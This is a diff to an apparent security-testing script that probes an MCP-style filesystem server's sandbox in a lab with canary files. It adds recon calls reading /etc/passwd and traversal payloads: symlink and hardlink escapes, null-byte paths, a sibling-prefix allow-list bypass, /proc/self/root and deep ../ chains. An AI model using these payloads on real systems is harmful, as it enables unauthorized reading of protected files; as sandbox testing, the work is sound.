@@ -472,6 +472,107 @@ def write_source_notes() -> None:
     NOTES_OUT.write_text("".join(lines), encoding="utf-8")
 
 
+# ---------------------------------------------------------------------------
+# Phase 1 — Recon. Legitimate-looking requests whose errors leak info.
+# ---------------------------------------------------------------------------
+
+def recon_calls() -> list[StepCall]:
+    return [
+        StepCall("RECON", 1, "", "read_file", "",
+                 label="empty-string path — does error echo allowed dirs?"),
+        StepCall("RECON", 2, "", "read_file", "/",
+                 label="root path — canonical sandbox path leak?"),
+        StepCall("RECON", 3, "", "list_directory", "",
+                 label="list empty path"),
+        StepCall("RECON", 4, "", "list_directory", "/",
+                 label="list root"),
+        StepCall("RECON", 5, "", "read_file", "/etc/passwd",
+                 label="direct /etc/passwd — expected block, fingerprint error shape"),
+        StepCall("RECON", 6, "", "read_file", "{SANDBOX}",
+                 label="read sandbox itself — EISDIR error shape"),
+        StepCall("RECON", 7, "", "list_directory", "{SANDBOX}/nonexistent",
+                 label="ENOENT error shape — does it echo absolute path?"),
+        StepCall("RECON", 8, "", "read_file", "{SANDBOX}/readme.txt",
+                 label="baseline success"),
+        StepCall("RECON", 9, "", "list_directory", "{SANDBOX}",
+                 label="baseline list success"),
+        StepCall("RECON", 10, "", "read_file", "../etc/passwd",
+                 label="relative traversal — what is cwd?"),
+    ]
+
+
+def run_recon_phase() -> list[StepResult]:
+    print("\n[Phase 1] Recon")
+    wipe_all()
+    return run_calls_both_versions(recon_calls())
+
+
+# ---------------------------------------------------------------------------
+# Phase 2 — Primitive discovery. One question per probe.
+# ---------------------------------------------------------------------------
+
+def plant_primitives(version: str) -> None:
+    """Build the fixture set needed by Phase 2 primitives."""
+    sandbox = SANDBOXES[version]
+    victim = VICTIMS[version]
+    script = f"""
+        set -e
+        cd {sandbox!r}
+        ln -sf {victim!r}/passwd_canary sym_to_canary
+        ln -f {victim!r}/passwd_canary hard_to_canary || true
+        python3 -c 'open("cafe\\u0301.txt", "w").write("NFD file content\\n")'
+        python3 -c 'open("caf\\u00e9.txt", "w").write("NFC file content\\n")'
+        python3 -c 'open("ok.txt", "w").write("null prefix content\\n")'
+    """
+    wsl_bash(script)
+
+
+def primitive_calls() -> list[StepCall]:
+    return [
+        StepCall("PRIM", 1, "ln -s {VICTIM}/passwd_canary {SANDBOX}/sym_to_canary",
+                 "read_file", "{SANDBOX}/sym_to_canary",
+                 label="Q: does realpath reject the symlink target outside sandbox?"),
+        StepCall("PRIM", 2, "ln {VICTIM}/passwd_canary {SANDBOX}/hard_to_canary",
+                 "read_file", "{SANDBOX}/hard_to_canary",
+                 label="Q: does realpath detect hardlinks? (it cannot — main bet)"),
+        StepCall("PRIM", 3, "", "read_file", "{SANDBOX}_evil/anything",
+                 label="Q: is allow-list startsWith without trailing slash?"),
+        StepCall("PRIM", 4, "NFD-named file plant",
+                 "read_file", "{SANDBOX}/caf\u00e9.txt",
+                 label="Q: NFC query finds NFD-named file?"),
+        StepCall("PRIM", 5, "", "read_file", "{SANDBOX}/ok.txt\x00hidden",
+                 label="Q: does path handling truncate at null byte?"),
+        StepCall("PRIM", 6, "", "read_file", "{SANDBOX}/../mcp_attack_328/readme.txt",
+                 label="Q: normalize before allow-list check?"),
+        StepCall("PRIM", 7, "", "list_directory", "{SANDBOX}/.",
+                 label="Q: '.' segment pass through normalize?"),
+        StepCall("PRIM", 8, "", "read_file", "{SANDBOX}/./readme.txt",
+                 label="Q: dot-segment normalization consistent?"),
+        StepCall("PRIM", 9, "", "read_file", "{SANDBOX}//readme.txt",
+                 label="Q: double-slash collapsed by normalize?"),
+        StepCall("PRIM", 10, "", "read_file", "{SANDBOX}/readme.txt\x00",
+                 label="Q: trailing null byte — rejected or truncated?"),
+        StepCall("PRIM", 11, "", "read_file", "/proc/self/root{SANDBOX}/readme.txt",
+                 label="Q: procfs self/root prefix handled?"),
+        StepCall("PRIM", 12, "", "read_file", 42,
+                 label="Q: integer path — schema rejection?"),
+        StepCall("PRIM", 13, "", "read_file", ["{SANDBOX}/readme.txt"],
+                 label="Q: array path — schema rejection?"),
+        StepCall("PRIM", 14, "", "read_file", "a" * 5000,
+                 label="Q: very long path — ENAMETOOLONG or truncation?"),
+        StepCall("PRIM", 15, "", "read_file", "{SANDBOX}/" + "../" * 20 + "etc/passwd",
+                 label="Q: 20-level traversal collapse?"),
+    ]
+
+
+def run_primitives_phase() -> list[StepResult]:
+    print("\n[Phase 2] Primitives")
+    for v in SANDBOXES:
+        wipe_and_recreate(v)
+        plant_primitives(v)
+    return run_calls_both_versions(primitive_calls())
+
+
 def main() -> None:
     REPORTS_DIR.mkdir(parents=True, exist_ok=True)
     print("attack_fs_chains.py — scaffold OK (no phases implemented yet)")
